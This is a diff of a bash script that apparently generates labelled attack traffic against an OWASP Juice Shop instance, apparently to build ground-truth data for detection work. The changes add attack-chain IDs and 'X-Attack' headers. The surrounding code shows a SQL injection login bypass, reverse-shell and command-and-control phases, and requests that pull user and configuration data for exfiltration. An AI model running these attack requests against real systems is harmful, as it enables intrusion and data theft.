@@ -24,6 +24,7 @@ ATTACK_FILE=""
 START_LINE=""
 END_LINE=""
 ATTACK_CHAIN_ID=""
+ATTACK_CHAIN_TYPE=""
 
 # Color output
 RED='\033[0;31m'
@@ -40,6 +41,30 @@ log_phase() {
     echo "{\"timestamp\":\"$timestamp\",\"phase\":\"$phase\",\"message\":\"$message\",\"container_ip\":\"$(hostname -i | awk '{print $1}')\"}" | tee -a "$LOG_FILE"
 }
 
+# Function to select random attack chain type
+select_attack_chain_type() {
+    local chain_types=(
+        "APT_chain"           # Advanced Persistent Threat chain
+        "ransomware_chain"    # Ransomware deployment chain
+        "data_theft_chain"    # Data exfiltration focused chain
+        "crypto_mining_chain" # Cryptocurrency mining chain
+        "botnet_chain"        # Botnet recruitment chain
+        "web_defacement_chain" # Website defacement chain
+    )
+    
+    # Select random chain type
+    local random_index=$((RANDOM % ${#chain_types[@]}))
+    ATTACK_CHAIN_TYPE="${chain_types[$random_index]}"
+    
+    # Generate unique chain ID with type prefix
+    local ts=$(date +%s)
+    local container_id=$(hostname | cut -c1-8)
+    ATTACK_CHAIN_ID="${ATTACK_CHAIN_TYPE}_${ts}_${container_id}_$$"
+    
+    echo "[*] Selected attack chain type: $ATTACK_CHAIN_TYPE"
+    echo "[*] Generated chain ID: $ATTACK_CHAIN_ID"
+}
+
 # Function to generate standard attack headers for ground truth
 get_attack_headers() {
     local attack_type="$1"
@@ -47,10 +72,21 @@ get_attack_headers() {
     local chain_id="$3"
     local timestamp=$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)
     
+    # Generate event ID for the entire attack chain (only on phase 1)
+    if [[ "$phase" == "1" ]] || [[ -z "$ATTACK_EVENT_ID" ]]; then
+        local ts=$(date +%s)
+        local container_id=$(hostname | cut -c1-8)
+        ATTACK_EVENT_ID="event_${ts}_${container_id}_$$"
+    fi
+    
     echo "-H \"User-Agent: Advanced-Attack-Tool/1.0 (Linux; Attacker-Bot)\" \
           -H \"X-Attack-Phase: $phase\" \
           -H \"X-Attack-Type: $attack_type\" \
           -H \"X-Attack-Chain-ID: $chain_id\" \
+          -H \"X-Attack-Event-ID: $ATTACK_EVENT_ID\" \
+          -H \"X-Payload-Category: advanced_attack\" \
+          -H \"X-Traffic-Type: attack\" \
+          -H \"X-Attack-ID: phase${phase}_${attack_type}\" \
           -H \"X-Forwarded-For: 192.168.1.100\" \
           -H \"X-Real-IP: 192.168.1.100\" \
           -H \"X-Attack-Timestamp: $timestamp\" \
@@ -118,13 +154,24 @@ execute_lateral_movement_attack() {
         echo "[*] Attempting lateral movement to: $target"
         
         # Execute the lateral movement command
-        local attack_headers=$(get_attack_headers "lateral_movement" "4" "$chain_id")
+        local timestamp=$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)
         
         # For lateral movement, we'll use the payload as a command to execute
         local response=$(curl -s -w "%{http_code}" -X POST "$TARGET$endpoint" \
             -H "Content-Type: application/json" \
-            -d "$payload" \
-            $attack_headers)
+            -H "User-Agent: Advanced-Attack-Tool/1.0 (Linux; Attacker-Bot)" \
+            -H "X-Attack-Phase: 4" \
+            -H "X-Attack-Type: lateral_movement" \
+            -H "X-Attack-Chain-ID: $chain_id" \
+            -H "X-Attack-Event-ID: $ATTACK_EVENT_ID" \
+            -H "X-Payload-Category: advanced_attack" \
+            -H "X-Traffic-Type: attack" \
+            -H "X-Attack-ID: phase4_lateral_movement" \
+            -H "X-Forwarded-For: 192.168.1.100" \
+            -H "X-Real-IP: 192.168.1.100" \
+            -H "X-Attack-Timestamp: $timestamp" \
+            -H "X-Attack-Source: attacker" \
+            -d "$payload")
         
         local status_code="${response: -3}"
         local response_body="${response%???}"
@@ -193,6 +240,16 @@ execute_payload_attack() {
     echo "[*] Executing: $description (Chain: $chain_id)"
     log_phase "$PHASE" "Executing payload: $description (Chain: $chain_id)"
     
+    # Generate headers for this request
+    local timestamp=$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)
+    
+    # Generate event ID for the entire attack chain (only on phase 1)
+    if [[ "$PHASE" == "1" ]] || [[ -z "$ATTACK_EVENT_ID" ]]; then
+        local ts=$(date +%s)
+        local container_id=$(hostname | cut -c1-8)
+        ATTACK_EVENT_ID="event_${ts}_${container_id}_$$"
+    fi
+    
     local response
     if [[ "$method" == "POST" ]]; then
         response=$(curl -s -w "%{http_code}" \
@@ -202,9 +259,13 @@ execute_payload_attack() {
             -H "X-Attack-Phase: $PHASE" \
             -H "X-Attack-Type: $ATTACK_TYPE" \
             -H "X-Attack-Chain-ID: $chain_id" \
+            -H "X-Attack-Event-ID: $ATTACK_EVENT_ID" \
+            -H "X-Payload-Category: advanced_attack" \
+            -H "X-Traffic-Type: attack" \
+            -H "X-Attack-ID: phase${PHASE}_${ATTACK_TYPE}" \
             -H "X-Forwarded-For: 192.168.1.100" \
             -H "X-Real-IP: 192.168.1.100" \
-            -H "X-Attack-Timestamp: $(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)" \
+            -H "X-Attack-Timestamp: $timestamp" \
             -H "X-Attack-Source: attacker" \
             -d "$payload" \
             --max-time 10 \
@@ -216,9 +277,13 @@ execute_payload_attack() {
             -H "X-Attack-Phase: $PHASE" \
             -H "X-Attack-Type: $ATTACK_TYPE" \
             -H "X-Attack-Chain-ID: $chain_id" \
+            -H "X-Attack-Event-ID: $ATTACK_EVENT_ID" \
+            -H "X-Payload-Category: advanced_attack" \
+            -H "X-Traffic-Type: attack" \
+            -H "X-Attack-ID: phase${PHASE}_${ATTACK_TYPE}" \
             -H "X-Forwarded-For: 192.168.1.100" \
             -H "X-Real-IP: 192.168.1.100" \
-            -H "X-Attack-Timestamp: $(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)" \
+            -H "X-Attack-Timestamp: $timestamp" \
             -H "X-Attack-Source: attacker" \
             --max-time 10 \
             "$TARGET$endpoint")
@@ -258,12 +323,25 @@ phase1_shell_acquisition() {
     
     # test sql injection
     cmd_payload='{"email":"admin@juice-sh.op'\'' OR 1=1--","password":"test"}'
+    
+    # Generate event ID for the entire attack chain (only on phase 1)
+    if [[ -z "$ATTACK_EVENT_ID" ]]; then
+        local ts=$(date +%s)
+        local container_id=$(hostname | cut -c1-8)
+        ATTACK_EVENT_ID="event_${ts}_${container_id}_$$"
+    fi
+    
     response=$(curl -s -w "%{http_code}" \
         -X POST \
         -H "Content-Type: application/json" \
         -H "User-Agent: Advanced-Attack-Tool/1.0 (Linux; Attacker-Bot)" \
         -H "X-Attack-Phase: 1" \
         -H "X-Attack-Type: sql_injection" \
+        -H "X-Attack-Chain-ID: $ATTACK_CHAIN_ID" \
+        -H "X-Attack-Event-ID: $ATTACK_EVENT_ID" \
+        -H "X-Payload-Category: advanced_attack" \
+        -H "X-Traffic-Type: attack" \
+        -H "X-Attack-ID: phase1_sql_injection" \
         -H "X-Forwarded-For: 192.168.1.100" \
         -H "X-Real-IP: 192.168.1.100" \
         -H "X-Attack-Timestamp: $(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)" \
@@ -289,6 +367,11 @@ phase1_shell_acquisition() {
             -H "User-Agent: Advanced-Attack-Tool/1.0 (Linux; Attacker-Bot)" \
             -H "X-Attack-Phase: 1" \
             -H "X-Attack-Type: reverse_shell" \
+            -H "X-Attack-Chain-ID: $ATTACK_CHAIN_ID" \
+            -H "X-Attack-Event-ID: $ATTACK_EVENT_ID" \
+            -H "X-Payload-Category: advanced_attack" \
+            -H "X-Traffic-Type: attack" \
+            -H "X-Attack-ID: phase1_reverse_shell" \
             -H "X-Forwarded-For: 192.168.1.100" \
             -H "X-Real-IP: 192.168.1.100" \
             -H "X-Attack-Timestamp: $(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)" \
@@ -350,7 +433,18 @@ phase2_c2_communication() {
         sleep 2
         
         c2_test=$(curl -s -w "%{http_code}" \
-            $(get_attack_headers "c2_communication" "2" "c2_chain_001") \
+            -H "User-Agent: Advanced-Attack-Tool/1.0 (Linux; Attacker-Bot)" \
+            -H "X-Attack-Phase: 2" \
+            -H "X-Attack-Type: c2_communication" \
+            -H "X-Attack-Chain-ID: $ATTACK_CHAIN_ID" \
+            -H "X-Attack-Event-ID: $ATTACK_EVENT_ID" \
+            -H "X-Payload-Category: advanced_attack" \
+            -H "X-Traffic-Type: attack" \
+            -H "X-Attack-ID: phase2_c2_communication" \
+            -H "X-Forwarded-For: 192.168.1.100" \
+            -H "X-Real-IP: 192.168.1.100" \
+            -H "X-Attack-Timestamp: $(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)" \
+            -H "X-Attack-Source: attacker" \
             --max-time 5 \
             "http://localhost:8080" 2>/dev/null || echo "000")
         
@@ -408,8 +502,18 @@ phase2_c2_communication() {
     c2_sim_response=$(curl -s -w "%{http_code}" \
         -X POST \
         -H "Content-Type: application/json" \
+        -H "User-Agent: Advanced-Attack-Tool/1.0 (Linux; Attacker-Bot)" \
         -H "X-Attack-Phase: 2" \
         -H "X-Attack-Type: c2_simulation" \
+        -H "X-Attack-Chain-ID: $ATTACK_CHAIN_ID" \
+        -H "X-Attack-Event-ID: $ATTACK_EVENT_ID" \
+        -H "X-Payload-Category: advanced_attack" \
+        -H "X-Traffic-Type: attack" \
+        -H "X-Attack-ID: phase2_c2_simulation" \
+        -H "X-Forwarded-For: 192.168.1.100" \
+        -H "X-Real-IP: 192.168.1.100" \
+        -H "X-Attack-Timestamp: $(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)" \
+        -H "X-Attack-Source: attacker" \
         -d "$c2_sim_payload" \
         --max-time 15 \
         "$TARGET/rest/admin/application-configuration")
@@ -456,15 +560,48 @@ phase3_data_exfiltration() {
     echo "Starting to collect sensitive data through API..." 
     
     # collect user information
-    curl -s $(get_attack_headers "file_discovery" "3" "exfil_chain_001") \
+    curl -s -H "User-Agent: Advanced-Attack-Tool/1.0 (Linux; Attacker-Bot)" \
+        -H "X-Attack-Phase: 3" \
+        -H "X-Attack-Type: file_discovery" \
+        -H "X-Attack-Chain-ID: $ATTACK_CHAIN_ID" \
+        -H "X-Attack-Event-ID: $ATTACK_EVENT_ID" \
+        -H "X-Payload-Category: advanced_attack" \
+        -H "X-Traffic-Type: attack" \
+        -H "X-Attack-ID: phase3_file_discovery" \
+        -H "X-Forwarded-For: 192.168.1.100" \
+        -H "X-Real-IP: 192.168.1.100" \
+        -H "X-Attack-Timestamp: $(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)" \
+        -H "X-Attack-Source: attacker" \
         "$TARGET/rest/user/authentication-details" > /tmp/user_details.json 2>/dev/null || true
     
     # collect product information  
-    curl -s $(get_attack_headers "data_collection" "3" "exfil_chain_001") \
+    curl -s -H "User-Agent: Advanced-Attack-Tool/1.0 (Linux; Attacker-Bot)" \
+        -H "X-Attack-Phase: 3" \
+        -H "X-Attack-Type: data_collection" \
+        -H "X-Attack-Chain-ID: $ATTACK_CHAIN_ID" \
+        -H "X-Attack-Event-ID: $ATTACK_EVENT_ID" \
+        -H "X-Payload-Category: advanced_attack" \
+        -H "X-Traffic-Type: attack" \
+        -H "X-Attack-ID: phase3_data_collection" \
+        -H "X-Forwarded-For: 192.168.1.100" \
+        -H "X-Real-IP: 192.168.1.100" \
+        -H "X-Attack-Timestamp: $(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)" \
+        -H "X-Attack-Source: attacker" \
         "$TARGET/api/Products" > /tmp/products_data.json 2>/dev/null || true
     
     # collect application configuration
-    curl -s $(get_attack_headers "config_read" "3" "exfil_chain_001") \
+    curl -s -H "User-Agent: Advanced-Attack-Tool/1.0 (Linux; Attacker-Bot)" \
+        -H "X-Attack-Phase: 3" \
+        -H "X-Attack-Type: config_read" \
+        -H "X-Attack-Chain-ID: $ATTACK_CHAIN_ID" \
+        -H "X-Attack-Event-ID: $ATTACK_EVENT_ID" \
+        -H "X-Payload-Category: advanced_attack" \
+        -H "X-Traffic-Type: attack" \
+        -H "X-Attack-ID: phase3_config_read" \
+        -H "X-Forwarded-For: 192.168.1.100" \
+        -H "X-Real-IP: 192.168.1.100" \
+        -H "X-Attack-Timestamp: $(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)" \
+        -H "X-Attack-Source: attacker" \
         "$TARGET/rest/admin/application-configuration" > /tmp/app_config.json 2>/dev/null || true
     
     # simulate command execution to collect system information
@@ -477,7 +614,18 @@ phase3_data_exfiltration() {
             discovery_response=$(curl -s -w "%{http_code}" \
         -X POST \
         -H "Content-Type: application/json" \
-        $(get_attack_headers "file_discovery" "3" "exfil_chain_002") \
+        -H "User-Agent: Advanced-Attack-Tool/1.0 (Linux; Attacker-Bot)" \
+        -H "X-Attack-Phase: 3" \
+        -H "X-Attack-Type: file_discovery" \
+        -H "X-Attack-Chain-ID: $ATTACK_CHAIN_ID" \
+        -H "X-Attack-Event-ID: $ATTACK_EVENT_ID" \
+        -H "X-Payload-Category: advanced_attack" \
+        -H "X-Traffic-Type: attack" \
+        -H "X-Attack-ID: phase3_file_discovery" \
+        -H "X-Forwarded-For: 192.168.1.100" \
+        -H "X-Real-IP: 192.168.1.100" \
+        -H "X-Attack-Timestamp: $(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)" \
+        -H "X-Attack-Source: attacker" \
         -d "$file_discovery_payload" \
         --max-time 10 \
         "$TARGET/rest/user/login")
@@ -496,7 +644,18 @@ phase3_data_exfiltration() {
         config_response=$(curl -s -w "%{http_code}" \
             -X POST \
             -H "Content-Type: application/json" \
-            $(get_attack_headers "config_read" "3" "exfil_chain_002") \
+            -H "User-Agent: Advanced-Attack-Tool/1.0 (Linux; Attacker-Bot)" \
+            -H "X-Attack-Phase: 3" \
+            -H "X-Attack-Type: config_read" \
+            -H "X-Attack-Chain-ID: $ATTACK_CHAIN_ID" \
+            -H "X-Attack-Event-ID: $ATTACK_EVENT_ID" \
+            -H "X-Payload-Category: advanced_attack" \
+            -H "X-Traffic-Type: attack" \
+            -H "X-Attack-ID: phase3_config_read" \
+            -H "X-Forwarded-For: 192.168.1.100" \
+            -H "X-Real-IP: 192.168.1.100" \
+            -H "X-Attack-Timestamp: $(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)" \
+            -H "X-Attack-Source: attacker" \
             -d "$config_read_payload" \
             --max-time 10 \
             "$TARGET/rest/admin/application-configuration")
@@ -535,7 +694,18 @@ phase3_data_exfiltration() {
                     exfil_response=$(curl -s -w "%{http_code}" \
                         -X POST \
                         -H "Content-Type: application/json" \
-                        $(get_attack_headers "file_exfiltration" "3" "exfil_chain_002") \
+                        -H "User-Agent: Advanced-Attack-Tool/1.0 (Linux; Attacker-Bot)" \
+                        -H "X-Attack-Phase: 3" \
+                        -H "X-Attack-Type: file_exfiltration" \
+                        -H "X-Attack-Chain-ID: $ATTACK_CHAIN_ID" \
+                        -H "X-Attack-Event-ID: $ATTACK_EVENT_ID" \
+                        -H "X-Payload-Category: advanced_attack" \
+                        -H "X-Traffic-Type: attack" \
+                        -H "X-Attack-ID: phase3_file_exfiltration" \
+                        -H "X-Forwarded-For: 192.168.1.100" \
+                        -H "X-Real-IP: 192.168.1.100" \
+                        -H "X-Attack-Timestamp: $(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)" \
+                        -H "X-Attack-Source: attacker" \
                         -d "$exfil_payload" \
                         --max-time 15 \
                         "$TARGET/rest/admin/application-configuration")
@@ -552,7 +722,18 @@ phase3_data_exfiltration() {
                     exfil_response=$(curl -s -w "%{http_code}" \
                         -X POST \
                         -H "Content-Type: application/json" \
-                        $(get_attack_headers "dns_exfiltration" "3" "exfil_chain_003") \
+                        -H "User-Agent: Advanced-Attack-Tool/1.0 (Linux; Attacker-Bot)" \
+                        -H "X-Attack-Phase: 3" \
+                        -H "X-Attack-Type: dns_exfiltration" \
+                        -H "X-Attack-Chain-ID: $ATTACK_CHAIN_ID" \
+                        -H "X-Attack-Event-ID: $ATTACK_EVENT_ID" \
+                        -H "X-Payload-Category: advanced_attack" \
+                        -H "X-Traffic-Type: attack" \
+                        -H "X-Attack-ID: phase3_dns_exfiltration" \
+                        -H "X-Forwarded-For: 192.168.1.100" \
+                        -H "X-Real-IP: 192.168.1.100" \
+                        -H "X-Attack-Timestamp: $(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)" \
+                        -H "X-Attack-Source: attacker" \
                         -d "$dns_exfil_payload" \
                         --max-time 10 \
                         "$TARGET/rest/admin/application-configuration")
@@ -569,7 +750,18 @@ phase3_data_exfiltration() {
                     exfil_response=$(curl -s -w "%{http_code}" \
                         -X POST \
                         -H "Content-Type: application/json" \
-                        $(get_attack_headers "file_exfiltration" "3" "exfil_chain_004") \
+                        -H "User-Agent: Advanced-Attack-Tool/1.0 (Linux; Attacker-Bot)" \
+                        -H "X-Attack-Phase: 3" \
+                        -H "X-Attack-Type: file_exfiltration" \
+                        -H "X-Attack-Chain-ID: $ATTACK_CHAIN_ID" \
+                        -H "X-Attack-Event-ID: $ATTACK_EVENT_ID" \
+                        -H "X-Payload-Category: advanced_attack" \
+                        -H "X-Traffic-Type: attack" \
+                        -H "X-Attack-ID: phase3_file_exfiltration" \
+                        -H "X-Forwarded-For: 192.168.1.100" \
+                        -H "X-Real-IP: 192.168.1.100" \
+                        -H "X-Attack-Timestamp: $(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)" \
+                        -H "X-Attack-Source: attacker" \
                         -d "$file_exfil_payload" \
                         --max-time 10 \
                         "$TARGET/rest/admin/application-configuration")
@@ -599,6 +791,9 @@ phase3_data_exfiltration() {
 
 # main execution function
 execute_advanced_attack() {
+    # Select attack chain type at the beginning
+    select_attack_chain_type
+    
     log_phase "main" "Starting advanced three-phase attack"
     echo -e "${YELLOW}=== Advanced three-phase attack started ===${NC}"
     
@@ -662,6 +857,9 @@ generate_attack_report() {
 {
   "attack_summary": {
     "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)",
+    "attack_chain_type": "$ATTACK_CHAIN_TYPE",
+    "attack_chain_id": "$ATTACK_CHAIN_ID",
+    "attack_event_id": "$ATTACK_EVENT_ID",
     "total_phases": 3,
     "successful_phases": $success_count,
     "success_rate": "$(echo "scale=2; $success_count * 100 / 3" | bc)%",
